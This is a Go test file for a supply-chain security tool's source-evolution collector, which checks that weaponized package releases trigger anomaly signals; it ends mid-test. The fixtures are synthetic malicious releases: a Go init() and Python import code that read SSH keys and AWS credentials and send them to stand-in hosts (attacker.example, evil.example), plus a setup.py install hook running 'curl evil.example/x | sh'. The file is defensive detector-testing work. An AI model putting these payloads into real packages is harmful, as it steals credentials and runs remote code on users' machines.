package source

import (
	"context"
	"encoding/json"
	"errors"
	"os"
	"path/filepath"
	"testing"
	"time"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"

	"github.com/sarahmaeve/signatory/internal/profile"
	"github.com/sarahmaeve/signatory/internal/signal"
	"github.com/sarahmaeve/signatory/internal/signal/source/astfeature"
)

// fakePinSource is a hand-built VersionPinSource for collector
// tests. Returns the table verbatim if err is nil, otherwise the
// configured error.
type fakePinSource struct {
	table PinTable
	err   error
}

func (f *fakePinSource) VersionPinTable(_ context.Context, _ *profile.Entity) (PinTable, error) {
	if f.err != nil {
		return PinTable{}, f.err
	}
	return f.table, nil
}

// versionFixture is one tagged version's file layout — used by
// initRepoWithVersionedProgression to build a multi-version git
// repo for the load-bearing integration test.
type versionFixture struct {
	Tag   string
	Files map[string]string
}

// initRepoWithVersionedProgression builds a git repo at a fresh
// tempdir, applying each fixture in order: clear the working
// tree (preserving .git), write the fixture's files, commit, and
// tag. Returns the clone path plus a tag → commit-SHA map for
// pin-table fixture construction.
//
// Each commit replaces the working tree wholesale — that's what
// "version progression" means here. The repo's tag history mirrors
// what proxy.golang.org would emit for a real Go module.
func initRepoWithVersionedProgression(t *testing.T, versions []versionFixture) (clonePath string, shaByTag map[string]string) {
	t.Helper()
	clonePath = t.TempDir()
	runGit(t, clonePath, "init", "-b", "main", "-q")
	runGit(t, clonePath, "config", "user.email", "test@example.invalid")
	runGit(t, clonePath, "config", "user.name", "Test")
	runGit(t, clonePath, "config", "commit.gpgsign", "false")
	runGit(t, clonePath, "config", "tag.gpgSign", "false")

	shaByTag = make(map[string]string, len(versions))

	for i, v := range versions {
		if i > 0 {
			clearWorkingTree(t, clonePath)
		}
		for path, content := range v.Files {
			writeFile(t, clonePath, path, content)
		}
		runGit(t, clonePath, "add", "-A")
		runGit(t, clonePath, "commit", "-m", "version "+v.Tag)
		runGit(t, clonePath, "tag", v.Tag)
		shaByTag[v.Tag] = captureGitOutput(t, clonePath, "rev-parse", "HEAD")
	}
	return clonePath, shaByTag
}

// clearWorkingTree removes every entry under clonePath except
// .git. Used between successive versions to simulate full-tree
// replacement (matches what `git checkout <tag>` would produce).
func clearWorkingTree(t *testing.T, clonePath string) {
	t.Helper()
	ents, err := os.ReadDir(clonePath)
	require.NoError(t, err)
	for _, ent := range ents {
		if ent.Name() == ".git" {
			continue
		}
		require.NoError(t, os.RemoveAll(filepath.Join(clonePath, ent.Name())))
	}
}

// goEntity returns a Go-ecosystem profile.Entity. Tests vary the
// CanonicalURI / Ecosystem to exercise different dispatch cases.
func goEntity(modulePath string) *profile.Entity {
	return &profile.Entity{
		ID:           "ent-" + modulePath,
		CanonicalURI: "pkg:golang/" + modulePath,
		Type:         profile.EntityPackage,
		Ecosystem:    "golang",
		ShortName:    modulePath,
	}
}

// pypiEntity returns a pypi-ecosystem profile.Entity. Source has
// already been resolved to a clone by the time the source-evolution
// collector runs, so only Ecosystem drives dispatch here.
func pypiEntity(pkg string) *profile.Entity {
	return &profile.Entity{
		ID:           "ent-pypi-" + pkg,
		CanonicalURI: "pkg:pypi/" + pkg,
		Type:         profile.EntityPackage,
		Ecosystem:    "pypi",
		ShortName:    pkg,
	}
}

// npmEntity returns an npm-ecosystem profile.Entity. Source has
// already been resolved to a clone by the time the source-evolution
// collector runs, so only Ecosystem drives dispatch here.
func npmEntity(pkg string) *profile.Entity {
	return &profile.Entity{
		ID:           "ent-npm-" + pkg,
		CanonicalURI: "pkg:npm/" + pkg,
		Type:         profile.EntityPackage,
		Ecosystem:    "npm",
		ShortName:    pkg,
	}
}

// cargoEntity returns a cargo-ecosystem profile.Entity. Source has
// already been resolved to a clone by the time the source-evolution
// collector runs, so only Ecosystem drives dispatch here.
func cargoEntity(name string) *profile.Entity {
	return &profile.Entity{
		ID:           "ent-cargo-" + name,
		CanonicalURI: "pkg:cargo/" + name,
		Type:         profile.EntityPackage,
		Ecosystem:    "cargo",
		ShortName:    name,
	}
}

// findEmittedSignal returns the first signal of the given type
// emitted in the result, or fails the test if not found.
func findEmittedSignal(t *testing.T, result *signal.CollectionResult, sigType string) profile.Signal {
	t.Helper()
	for _, s := range result.Signals() {
		if s.Type == sigType {
			return s
		}
	}
	t.Fatalf("signal %q not found in result; got %d signals", sigType, len(result.Signals()))
	return profile.Signal{}
}

// hasAbsenceForType reports whether the result holds an absence
// record of the form "absence:<sigType>".
func hasAbsenceForType(result *signal.CollectionResult, sigType string) bool {
	for _, s := range result.Signals() {
		if s.Type == "absence:"+sigType {
			return true
		}
	}
	return false
}

// ============================================================
// Skip / absence cases
// ============================================================

func TestCollector_NilEntity_EmptyResult(t *testing.T) {
	t.Parallel()
	c := NewCollector("/tmp/some-clone", &fakePinSource{}, false)
	result, err := c.Collect(context.Background(), nil)
	require.NoError(t, err)
	assert.Equal(t, 0, result.SignalCount())
	assert.Equal(t, 0, result.AbsenceCount())
}

// TestCollector_UnsupportedEcosystem_EmptyResult pins the
// languageProfile gate: an ecosystem with no analyzer skips silently
// (empty result, no error, no absence). go / pypi / npm / cargo are
// all supported, so this must use a still-unsupported ecosystem —
// gem — or it would assert against a supported path. When a gem
// analyzer lands, switch this to the next unsupported ecosystem.
func TestCollector_UnsupportedEcosystem_EmptyResult(t *testing.T) {
	t.Parallel()
	c := NewCollector("/tmp/some-clone", &fakePinSource{}, false)
	gemEntity := &profile.Entity{
		ID:           "e-rails",
		CanonicalURI: "pkg:gem/rails",
		Type:         profile.EntityPackage,
		Ecosystem:    "gem",
	}
	result, err := c.Collect(context.Background(), gemEntity)
	require.NoError(t, err)
	assert.Equal(t, 0, result.SignalCount())
	assert.Equal(t, 0, result.AbsenceCount())
}

func TestCollector_LegacyGoEcosystem_AlsoMatches(t *testing.T) {
	t.Parallel()
	// Pre-purl-canonicalization "go" ecosystem label still
	// triggers the collector. Without a pin source it falls
	// through to absence, but the dispatch fired.
	c := NewCollector("/tmp/some-clone", nil, false)
	entity := &profile.Entity{
		ID:           "ent-legacy",
		CanonicalURI: "pkg:go/example.com/legacy",
		Type:         profile.EntityPackage,
		Ecosystem:    "go",
	}
	result, err := c.Collect(context.Background(), entity)
	require.NoError(t, err)
	assert.True(t, hasAbsenceForType(result, "source_evolution_matrix"))
	assert.True(t, hasAbsenceForType(result, "source_evolution_anomaly"))
}

func TestCollector_NoPinSource_AbsencesBoth(t *testing.T) {
	t.Parallel()
	c := NewCollector("/tmp/some-clone", nil, false)
	result, err := c.Collect(context.Background(), goEntity("example.com/foo"))
	require.NoError(t, err)
	assert.True(t, hasAbsenceForType(result, "source_evolution_matrix"))
	assert.True(t, hasAbsenceForType(result, "source_evolution_anomaly"))
	assert.Equal(t, 0, result.SignalCount())
}

func TestCollector_PinTableNotAvailable_AbsencesBoth(t *testing.T) {
	t.Parallel()
	c := NewCollector("/tmp/some-clone", &fakePinSource{err: ErrPinTableNotAvailable}, false)
	result, err := c.Collect(context.Background(), goEntity("example.com/foo"))
	require.NoError(t, err)
	assert.True(t, hasAbsenceForType(result, "source_evolution_matrix"))
	assert.True(t, hasAbsenceForType(result, "source_evolution_anomaly"))
}

func TestCollector_PinTableOtherError_FailuresBoth(t *testing.T) {
	t.Parallel()
	wantErr := errors.New("transient store boom")
	c := NewCollector("/tmp/some-clone", &fakePinSource{err: wantErr}, false)
	result, err := c.Collect(context.Background(), goEntity("example.com/foo"))
	require.NoError(t, err)
	assert.True(t, hasAbsenceForType(result, "source_evolution_matrix"))
	assert.True(t, hasAbsenceForType(result, "source_evolution_anomaly"))
	// Failures (retryable) tracked separately from plain absences.
	assert.NotEmpty(t, result.Failures, "transient pin-source error should produce a Failure record")
}

func TestCollector_NoClonePath_AbsencesBoth(t *testing.T) {
	t.Parallel()
	pinSource := &fakePinSource{table: PinTable{ModulePath: "example.com/foo"}}
	c := NewCollector("", pinSource, false)
	result, err := c.Collect(context.Background(), goEntity("example.com/foo"))
	require.NoError(t, err)
	assert.True(t, hasAbsenceForType(result, "source_evolution_matrix"))
	assert.True(t, hasAbsenceForType(result, "source_evolution_anomaly"))
}

// ============================================================
// Load-bearing integration test
// ============================================================

// TestCollector_SyntheticProgression_MatrixSpikesAtV020 is the
// load-bearing test for the entire source-evolution stack. It
// exercises:
//
//  1. Real BlobStreamer against a real programmatic git repo
//  2. Real golang.Analyzer (AST parse + feature extraction)
//  3. Real Assembler (per-version + cross-version passes)
//  4. Real DetectAnomaly threshold logic
//  5. Real signal emission
//
// Stub VersionPinSource feeds in a hand-built pin table — that
// boundary is gopublish's responsibility, exercised by the
// gopublish unit + integration tests.
//
// The fixture mirrors the BufferZoneCorp grpc-client init payload
// pattern from the design doc: v0.1.0 has a clean Hello() function;
// v0.2.0 introduces an init() function that exercises every feature
// the analyzer counts (init + network + sensitive-path + exec +
// xor + base64). The matrix should reflect zeros at v0.1.0, full
// spike at v0.2.0; the anomaly should fire at v0.2.0 with all six
// features named.
//
// This test passing == the entire commit-7 pipeline working
// end-to-end on a payload matching the real-world threat that
// motivated the collector.
func TestCollector_SyntheticProgression_MatrixSpikesAtV020(t *testing.T) {
	t.Parallel()

	const cleanV010 = `package main

func Hello() string { return "hi" }
`
	const weaponizedV020 = `package main

import (
	"encoding/base64"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
)

var encodedURL = []byte{0x47, 0x71, 0x16, 0x35, 0x70, 0x47, 0x35, 0x6f}
var xorKey = []byte("grpcconn1")

func init() {
	for i := range encodedURL {
		encodedURL[i] ^= xorKey[i%len(xorKey)]
	}
	_, _ = base64.StdEncoding.DecodeString("aGVsbG8gd29ybGQ=")
	home, _ := os.UserHomeDir()
	_, _ = os.ReadFile(filepath.Join(home, ".ssh", "id_rsa"))
	_, _ = http.Post("https://attacker.example/beacon", "application/octet-stream", nil)
	_ = exec.Command("sh", "-c", "echo pwned")
}

func Hello() string { return "hi" }
`

	clonePath, shaByTag := initRepoWithVersionedProgression(t, []versionFixture{
		{Tag: "v0.1.0", Files: map[string]string{"main.go": cleanV010}},
		{Tag: "v0.2.0", Files: map[string]string{"main.go": weaponizedV020}},
	})

	pinSource := &fakePinSource{
		table: PinTable{
			ModulePath: "example.com/synth",
			Pins: []VersionPin{
				{Version: "v0.1.0", SHA: shaByTag["v0.1.0"], Source: "proxy.golang.org"},
				{Version: "v0.2.0", SHA: shaByTag["v0.2.0"], Source: "proxy.golang.org"},
			},
		},
	}

	c := NewCollector(clonePath, pinSource, false)
	entity := goEntity("example.com/synth")
	result, err := c.Collect(t.Context(), entity)
	require.NoError(t, err)
	require.Equal(t, 3, result.SignalCount(), "matrix + anomaly + concern expected")
	require.Equal(t, 0, result.AbsenceCount(), "happy path produces no absences")

	// ---- matrix ----

	matrixSig := findEmittedSignal(t, result, "source_evolution_matrix")
	assert.Equal(t, profile.SignalGroupPublication, matrixSig.Group)
	assert.Equal(t, profile.ForgeryVeryHigh, matrixSig.ForgeryResistance)
	assert.Equal(t, "source-evolution", matrixSig.Source)

	var matrix MatrixValue
	require.NoError(t, json.Unmarshal(matrixSig.Value, &matrix))
	assert.Equal(t, "example.com/synth", matrix.ModulePath)
	require.Len(t, matrix.Rows, 2)

	// rows[0] = v0.2.0 (newest, weaponized)
	v020 := matrix.Rows[0]
	assert.Equal(t, "v0.2.0", v020.Version)
	assert.Equal(t, TagSHALocalPresent, v020.TagSHALocalStatus)
	require.NotNil(t, v020.AST)
	assert.Equal(t, 1, v020.AST.InitCount, "v0.2.0 has one init()")
	assert.GreaterOrEqual(t, v020.AST.NetworkCallSites, 1, "v0.2.0 has http.Post")
	assert.GreaterOrEqual(t, v020.AST.SensitivePathReads, 1, "v0.2.0 reads ~/.ssh/id_rsa via filepath.Join")
	assert.GreaterOrEqual(t, v020.AST.ExecCalls, 1, "v0.2.0 has exec.Command")
	assert.GreaterOrEqual(t, v020.AST.XORAssignments, 1, "v0.2.0 has ^= in decode loop")
	assert.GreaterOrEqual(t, v020.AST.Base64DecodeCalls, 1, "v0.2.0 has base64.StdEncoding.DecodeString")

	// rows[1] = v0.1.0 (oldest, clean)
	v010 := matrix.Rows[1]
	assert.Equal(t, "v0.1.0", v010.Version)
	assert.Equal(t, TagSHALocalPresent, v010.TagSHALocalStatus)
	require.NotNil(t, v010.AST)
	assert.Zero(t, v010.AST.InitCount)
	assert.Zero(t, v010.AST.NetworkCallSites)
	assert.Zero(t, v010.AST.SensitivePathReads)
	assert.Zero(t, v010.AST.ExecCalls)
	assert.Zero(t, v010.AST.XORAssignments)
	assert.Zero(t, v010.AST.Base64DecodeCalls)

	// Cross-version: v0.2.0 has DiffFromPrevious populated.
	require.NotNil(t, v020.DiffFromPrevious, "newer row should have diff vs older")
	assert.Greater(t, v020.DiffFromPrevious.LinesAdded, 0)
	// v0.1.0 (oldest) has no previous to diff against.
	assert.Nil(t, v010.DiffFromPrevious)

	// ---- anomaly ----

	anomalySig := findEmittedSignal(t, result, "source_evolution_anomaly")
	assert.Equal(t, profile.SignalGroupPublication, anomalySig.Group)
	assert.Equal(t, profile.ForgeryVeryHigh, anomalySig.ForgeryResistance)

	var anomaly AnomalyValue
	require.NoError(t, json.Unmarshal(anomalySig.Value, &anomaly))
	assert.True(t, anomaly.AnomalyPresent, "all six features cross zero — anomaly must fire")
	assert.Equal(t, "v0.2.0", anomaly.FirstAnomalousVersion)
	assert.Equal(t, "v0.1.0", anomaly.PreviousVersion)
	// All six features should be in SpikedFeatures (canonical
	// order from spikedFeatures helper).
	assert.Equal(t, []string{
		"init_count",
		"network_call_sites",
		"sensitive_path_reads",
		"exec_calls",
		"xor_assignments",
		"base64_decode_calls",
	}, anomaly.SpikedFeatures)
}

// TestCollector_CleanProgression_NoAnomaly is the negative
// counterpart of the load-bearing test: legitimate package
// growth (Hello() then add Goodbye()) should NOT fire the
// anomaly. Validates that the threshold doesn't false-positive on
// benign multi-version evolutions.
func TestCollector_CleanProgression_NoAnomaly(t *testing.T) {
	t.Parallel()

	const v010 = `package main

func Hello() string { return "hi" }
`
	const v020 = `package main

func Hello() string { return "hi" }
func Goodbye() string { return "bye" }
`

	clonePath, shaByTag := initRepoWithVersionedProgression(t, []versionFixture{
		{Tag: "v0.1.0", Files: map[string]string{"main.go": v010}},
		{Tag: "v0.2.0", Files: map[string]string{"main.go": v020}},
	})

	pinSource := &fakePinSource{
		table: PinTable{
			ModulePath: "example.com/clean",
			Pins: []VersionPin{
				{Version: "v0.1.0", SHA: shaByTag["v0.1.0"], Source: "proxy.golang.org"},
				{Version: "v0.2.0", SHA: shaByTag["v0.2.0"], Source: "proxy.golang.org"},
			},
		},
	}

	c := NewCollector(clonePath, pinSource, false)
	result, err := c.Collect(t.Context(), goEntity("example.com/clean"))
	require.NoError(t, err)

	anomalySig := findEmittedSignal(t, result, "source_evolution_anomaly")
	var anomaly AnomalyValue
	require.NoError(t, json.Unmarshal(anomalySig.Value, &anomaly))
	assert.False(t, anomaly.AnomalyPresent, "legitimate package growth should NOT fire anomaly")
}

// TestCollector_HappyPath_EmitsBothSignals verifies the basic
// emission contract: even a single-version pin table produces
// both signals (matrix has one row; anomaly is no-op since there's
// no previous version to compare against).
func TestCollector_HappyPath_EmitsBothSignals(t *testing.T) {
	t.Parallel()

	const single = `package main

func Hello() {}
`
	clonePath, shaByTag := initRepoWithVersionedProgression(t, []versionFixture{
		{Tag: "v0.1.0", Files: map[string]string{"main.go": single}},
	})

	pinSource := &fakePinSource{
		table: PinTable{
			ModulePath: "example.com/single",
			Pins: []VersionPin{
				{Version: "v0.1.0", SHA: shaByTag["v0.1.0"], Source: "proxy.golang.org"},
			},
		},
	}

	c := NewCollector(clonePath, pinSource, false)
	result, err := c.Collect(t.Context(), goEntity("example.com/single"))
	require.NoError(t, err)

	assert.Equal(t, 3, result.SignalCount(), "matrix + anomaly + concern expected")
	matrixSig := findEmittedSignal(t, result, "source_evolution_matrix")
	var matrix MatrixValue
	require.NoError(t, json.Unmarshal(matrixSig.Value, &matrix))
	assert.Len(t, matrix.Rows, 1)

	anomalySig := findEmittedSignal(t, result, "source_evolution_anomaly")
	var anomaly AnomalyValue
	require.NoError(t, json.Unmarshal(anomalySig.Value, &anomaly))
	assert.False(t, anomaly.AnomalyPresent, "single-version matrix can't have a spike")
}

// TestCollector_PyPIEntity_EmitsBothSignals is the load-bearing
// test for items #1+#2: a pypi entity must run the full
// source-evolution pipeline off the version_pin_table the pypi
// collector now emits. The collector must (a) not skip at the
// ecosystem gate, (b) stream .py via isPythonSourceFile (not .go),
// (c) run the real Python analyzer over a benign fixture and score
// every AST attack feature zero — the collector-level
// no-false-positive baseline (AST.md §3).
func TestCollector_PyPIEntity_EmitsBothSignals(t *testing.T) {
	t.Parallel()

	const v1 = "def f():\n    return 1\n"
	const v2 = "def f():\n    return 1\n\n\ndef g():\n    return 2\n"
	clonePath, shaByTag := initRepoWithVersionedProgression(t, []versionFixture{
		{Tag: "1.0.0", Files: map[string]string{
			"pkg/__init__.py": "VERSION = '1.0.0'\n",
			"pkg/core.py":     v1,
			// Decoys that must NOT be streamed: a .go file and a test.
			"pkg/test_core.py": "def test_f():\n    assert True\n",
			"setup.go":         "package x\n",
		}},
		{Tag: "1.1.0", Files: map[string]string{
			"pkg/__init__.py": "VERSION = '1.1.0'\n",
			"pkg/core.py":     v2,
		}},
	})

	pinSource := &fakePinSource{
		table: PinTable{
			ModulePath: "demo",
			Pins: []VersionPin{
				{Version: "1.1.0", SHA: shaByTag["1.1.0"], Source: "pypi-attestation"},
				{Version: "1.0.0", SHA: shaByTag["1.0.0"], Source: "pypi-attestation"},
			},
		},
	}

	c := NewCollector(clonePath, pinSource, false)
	result, err := c.Collect(t.Context(), pypiEntity("demo"))
	require.NoError(t, err)

	assert.Equal(t, 3, result.SignalCount(),
		"pypi entity must emit matrix + anomaly + concern, not skip at the gate")

	matrixSig := findEmittedSignal(t, result, "source_evolution_matrix")
	var matrix MatrixValue
	require.NoError(t, json.Unmarshal(matrixSig.Value, &matrix))
	require.Len(t, matrix.Rows, 2)

	assert.Equal(t, "pypi", matrix.Ecosystem,
		"matrix must label a pypi entity as pypi, not the hardwired go")
	assert.Equal(t, "python", matrix.Language,
		"language must reflect the selected analyzer, not the hardwired go")

	for _, row := range matrix.Rows {
		require.NotNil(t, row.Structural, "structural pass must run for pypi (version %s)", row.Version)
		assert.Positive(t, row.Structural.LOC,
			"streamed .py LOC must be counted (version %s)", row.Version)
		if row.AST != nil {
			assert.Equal(t, astfeature.Counts{}, *row.AST,
				"benign Python must score every AST attack feature zero "+
					"through the real analyzer (no-false-positive baseline)")
		}
	}

	anomalySig := findEmittedSignal(t, result, "source_evolution_anomaly")
	var anomaly AnomalyValue
	require.NoError(t, json.Unmarshal(anomalySig.Value, &anomaly))
	assert.False(t, anomaly.AnomalyPresent,
		"two benign versions with identical zero AST counts cannot "+
			"spike a feature; no anomaly expected")
}

// TestCollector_PyPIWeaponizedProgression_FiresAnomaly is the
// Python analog of TestCollector_SyntheticProgression: a clean
// v1.0.0 that only defines a function, then a v1.1.0 whose
// __init__.py gains the dominant real PyPI payload shape —
// exec(base64.b64decode(...)) plus network exfil running at import
// time. The matrix must show zeros at v1.0.0, a spike at v1.1.0, and
// the anomaly must fire naming the crossed features. This is the
// end-to-end proof that the hand-written Python lexer→parser→
// extractor feeds the existing anomaly detector correctly.
func TestCollector_PyPIWeaponizedProgression_FiresAnomaly(t *testing.T) {
	t.Parallel()

	const cleanInit = "VERSION = '1.0.0'\n"
	const cleanCore = "import json\n\n\ndef parse(s):\n    return json.loads(s)\n"

	const weaponizedInit = "" +
		"import base64\n" +
		"import urllib.request\n" +
		"exec(base64.b64decode('aW1wb3J0IG9z'))\n" +
		"urllib.request.urlopen('http://evil.example/' + 'exfil')\n" +
		"VERSION = '1.1.0'\n"

	clonePath, shaByTag := initRepoWithVersionedProgression(t, []versionFixture{
		{Tag: "1.0.0", Files: map[string]string{
			"pkg/__init__.py": cleanInit,
			"pkg/core.py":     cleanCore,
		}},
		{Tag: "1.1.0", Files: map[string]string{
			"pkg/__init__.py": weaponizedInit,
			"pkg/core.py":     cleanCore,
		}},
	})

	pinSource := &fakePinSource{
		table: PinTable{
			ModulePath: "demo",
			Pins: []VersionPin{
				{Version: "1.0.0", SHA: shaByTag["1.0.0"], Source: "pypi-attestation",
					PublishedAt: time.Date(2026, 1, 1, 0, 0, 0, 0, time.UTC)},
				{Version: "1.1.0", SHA: shaByTag["1.1.0"], Source: "pypi-attestation",
					PublishedAt: time.Date(2026, 3, 1, 0, 0, 0, 0, time.UTC)},
			},
		},
	}

	c := NewCollector(clonePath, pinSource, false)
	result, err := c.Collect(t.Context(), pypiEntity("demo"))
	require.NoError(t, err)

	matrixSig := findEmittedSignal(t, result, "source_evolution_matrix")
	var matrix MatrixValue
	require.NoError(t, json.Unmarshal(matrixSig.Value, &matrix))
	require.Len(t, matrix.Rows, 2)

	byVersion := map[string]MatrixRow{}
	for _, r := range matrix.Rows {
		byVersion[r.Version] = r
	}
	require.NotNil(t, byVersion["1.0.0"].AST)
	assert.Equal(t, astfeature.Counts{}, *byVersion["1.0.0"].AST,
		"clean v1.0.0 must spike nothing")
	require.NotNil(t, byVersion["1.1.0"].AST)
	v2 := *byVersion["1.1.0"].AST
	assert.Positive(t, v2.DynamicEvalCalls, "exec() at import in v1.1.0")
	assert.Positive(t, v2.Base64DecodeCalls, "base64.b64decode in v1.1.0")
	assert.Positive(t, v2.NetworkCallSites, "urllib.request.urlopen in v1.1.0")
	assert.Positive(t, v2.ImportTimeCallSites, "module-scope calls in v1.1.0")

	anomalySig := findEmittedSignal(t, result, "source_evolution_anomaly")
	var anomaly AnomalyValue
	require.NoError(t, json.Unmarshal(anomalySig.Value, &anomaly))
	assert.True(t, anomaly.AnomalyPresent,
		"a clean→weaponized Python progression must trip the anomaly")
	assert.Equal(t, "1.1.0", anomaly.FirstAnomalousVersion)
	assert.Subset(t, anomaly.SpikedFeatures,
		[]string{"dynamic_eval_calls", "base64_decode_calls", "network_call_sites", "import_time_call_sites"},
		"the crossed features must be named for the analyst")
}

// TestCollector_PyPICredentialStealerProgression_FiresAnomaly
// covers the dominant *modern* PyPI payload: a clean release, then a
// release whose __init__.py harvests SSH keys + cloud credentials
// and exfils them on import. sensitive_path_reads must be among the
// named spiked features.
func TestCollector_PyPICredentialStealerProgression_FiresAnomaly(t *testing.T) {
	t.Parallel()

	const cleanInit = "VERSION = '2.0.0'\n"
	const cleanCore = "def configure(opts):\n    return dict(opts)\n"

	const stealerInit = "" +
		"import os\n" +
		"import urllib.request\n" +
		"_k = open(os.path.expanduser('~/.ssh/id_rsa')).read()\n" +
		"_a = open(os.path.expanduser('~/.aws/credentials')).read()\n" +
		"urllib.request.urlopen('http://evil.example/c2', data=_k.encode())\n" +
		"VERSION = '2.1.0'\n"

	clonePath, shaByTag := initRepoWithVersionedProgression(t, []versionFixture{
		{Tag: "2.0.0", Files: map[string]string{
			"pkg/__init__.py": cleanInit, "pkg/core.py": cleanCore,
		}},
		{Tag: "2.1.0", Files: map[string]string{
			"pkg/__init__.py": stealerInit, "pkg/core.py": cleanCore,
		}},
	})

	pinSource := &fakePinSource{
		table: PinTable{
			ModulePath: "demo",
			Pins: []VersionPin{
				{Version: "2.0.0", SHA: shaByTag["2.0.0"], Source: "pypi-attestation",
					PublishedAt: time.Date(2026, 2, 1, 0, 0, 0, 0, time.UTC)},
				{Version: "2.1.0", SHA: shaByTag["2.1.0"], Source: "pypi-attestation",
					PublishedAt: time.Date(2026, 4, 1, 0, 0, 0, 0, time.UTC)},
			},
		},
	}

	c := NewCollector(clonePath, pinSource, false)
	result, err := c.Collect(t.Context(), pypiEntity("demo"))
	require.NoError(t, err)

	anomalySig := findEmittedSignal(t, result, "source_evolution_anomaly")
	var anomaly AnomalyValue
	require.NoError(t, json.Unmarshal(anomalySig.Value, &anomaly))
	assert.True(t, anomaly.AnomalyPresent, "credential-stealer release must trip the anomaly")
	assert.Equal(t, "2.1.0", anomaly.FirstAnomalousVersion)
	assert.Contains(t, anomaly.SpikedFeatures, "sensitive_path_reads",
		"the credential-read capability gain must be named for the analyst")
}

// TestCollector_PyPISetupHookProgression_FiresAnomaly covers the
// iconic install-time vector: a clean declarative setup.py, then a
// release that adds a setuptools install-command subclass running a
// shell payload at `pip install`. install_hook_overrides must be
// among the named spiked features.
func TestCollector_PyPISetupHookProgression_FiresAnomaly(t *testing.T) {
	t.Parallel()

	const cleanSetup = "from setuptools import setup, find_packages\n" +
		"setup(name='demo', packages=find_packages())\n"
	const core = "def go():\n    return 1\n"

	const weaponizedSetup = "" +
		"from setuptools import setup\n" +
		"from setuptools.command.install import install\n" +
		"import os\n" +
		"class _Hook(install):\n" +
		"    def run(self):\n" +
		"        os.system('curl evil.example/x | sh')\n" +
		"        install.run(self)\n" +
		"setup(name='demo', cmdclass={'install': _Hook})\n"

	clonePath, shaByTag := initRepoWithVersionedProgression(t, []versionFixture{
		{Tag: "3.0.0", Files: map[string]string{"setup.py": cleanSetup, "demo/__init__.py": core}},
		{Tag: "3.1.0", Files: map[string]string{"setup.py": weaponizedSetup, "demo/__init__.py": core}},
	})

	pinSource := &fakePinSource{
		table: PinTable{
			ModulePath: "demo",
			Pins: []VersionPin{
				{Version: "3.0.0", SHA: shaByTag["3.0.0"], Source: "pypi-attestation",
					PublishedAt: time.Date(2026, 1, 10, 0, 0, 0, 0, time.UTC)},
				{Version: "3.1.0", SHA: shaByTag["3.1.0"], Source: "pypi-attestation",
					PublishedAt: time.Date(2026, 3, 10, 0, 0, 0, 0, time.UTC)},
			},
		},
	}

	c := NewCollector(clonePath, pinSource, false)
	result, err := c.Collect(t.Context(), pypiEntity("demo"))
	require.NoError(t, err)

	anomalySig := findEmittedSignal(t, result, "source_evolution_anomaly")
	var anomaly AnomalyValue
	require.NoError(t, json.Unmarshal(anomalySig.Value, &anomaly))
	assert.True(t, anomaly.AnomalyPresent, "a setup.py install-hook gain must trip the anomaly")
	assert.Equal(t, "3.1.0", anomaly.FirstAnomalousVersion)
	assert.Contains(t, anomaly.SpikedFeatures, "install_hook_overrides",
		"the install-hook capability gain must be named for the analyst")
}

// TestCollector_Name_IsSourceEvolution pins the source-tracking
// string. Any rename here cascades into stored signal rows and
// dogfood-metrics aggregations.
func TestCollector_Name_IsSourceEvolution(t *testing.T) {
	t.Parallel()
	c := NewCollector("", nil, false)
	assert.Equal(t, "source-evolution", c.Name())
}

// TestCollector_NpmEntity_BenignBaseline is the collector-level
// no-false-positive baseline for npm (AST.md §3): an npm entity must
// not skip at the ecosystem gate, must stream .js via isNodeSourceFile
// (not .go), run the real JS analyzer over a benign fixture, and score
// every AST attack feature zero with no anomaly.
func TestCollector_NpmEntity_BenignBaseline(t *testing.T) {
	t.Parallel()

	const v1 = "function parse(s) { return JSON.parse(s); }\nmodule.exports = { parse };\n"
	const v2 = v1 + "function ok() { return true; }\n"
	clonePath, shaByTag := initRepoWithVersionedProgression(t, []versionFixture{
		{Tag: "1.0.0", Files: map[string]string{
			"package.json": `{"name":"demo","version":"1.0.0"}`,
			"src/index.js": v1,
			// Decoys that must NOT be streamed.
			"src/index.test.js": "test('x', () => { eval('1'); });\n",
			"dist/bundle.js":    "eval(atob('x'));\n",
			"main.go":           "package x\n",
		}},
		{Tag: "1.1.0", Files: map[string]string{
			"package.json": `{"name":"demo","version":"1.1.0"}`,
			"src/index.js": v2,
		}},
	})

	pinSource := &fakePinSource{
		table: PinTable{
			ModulePath: "demo",
			Pins: []VersionPin{
				{Version: "1.0.0", SHA: shaByTag["1.0.0"], Source: "npm-gitHead",
					PublishedAt: time.Date(2026, 1, 1, 0, 0, 0, 0, time.UTC)},
				{Version: "1.1.0", SHA: shaByTag["1.1.0"], Source: "npm-gitHead",
					PublishedAt: time.Date(2026, 3, 1, 0, 0, 0, 0, time.UTC)},
			},
		},
	}

	c := NewCollector(clonePath, pinSource, false)
	result, err := c.Collect(t.Context(), npmEntity("demo"))
	require.NoError(t, err)

	assert.Equal(t, 3, result.SignalCount(),
		"npm entity must emit matrix + anomaly + concern, not skip at the gate")

	matrixSig := findEmittedSignal(t, result, "source_evolution_matrix")
	var matrix MatrixValue
	require.NoError(t, json.Unmarshal(matrixSig.Value, &matrix))
	require.Len(t, matrix.Rows, 2)
	assert.Equal(t, "npm", matrix.Ecosystem,
		"matrix must label an npm entity as npm, not the hardwired go")
	assert.Equal(t, "javascript", matrix.Language,
		"language must reflect the selected analyzer")

	for _, row := range matrix.Rows {
		require.NotNil(t, row.Structural, "structural pass must run (version %s)", row.Version)
		assert.Positive(t, row.Structural.LOC,
			"streamed .js LOC must be counted, decoys excluded (version %s)", row.Version)
		if row.AST != nil {
			assert.Equal(t, astfeature.Counts{}, *row.AST,
				"benign JS must score every AST attack feature zero "+
					"through the real analyzer (no-false-positive baseline) — "+
					"the eval() decoys in test/dist files must not be streamed")
		}
	}

	anomalySig := findEmittedSignal(t, result, "source_evolution_anomaly")
	var anomaly AnomalyValue
	require.NoError(t, json.Unmarshal(anomalySig.Value, &anomaly))
	assert.False(t, anomaly.AnomalyPresent,
		"two benign JS versions cannot spike a feature; no anomaly expected")
}

// TestCollector_NpmWeaponizedProgression_FiresAnomaly is the npm
// analog of the Go/PyPI progression tests: a clean v1.0.0, then a
// v1.1.0 whose entrypoint gains the dominant npm payload shape —
// a require()'d child_process running a shell command plus network
// exfil and an eval, all at module (require) time. The matrix shows
// zeros at v1.0.0, a spike at v1.1.0, and the anomaly fires naming
// the crossed features. End-to-end proof the hand-written JS/TS
// lexer→parser→extractor feeds the existing anomaly detector.
func TestCollector_NpmWeaponizedProgression_FiresAnomaly(t *testing.T) {
	t.Parallel()

	const cleanIndex = "function parse(s) { return JSON.parse(s); }\nmodule.exports = { parse };\n"
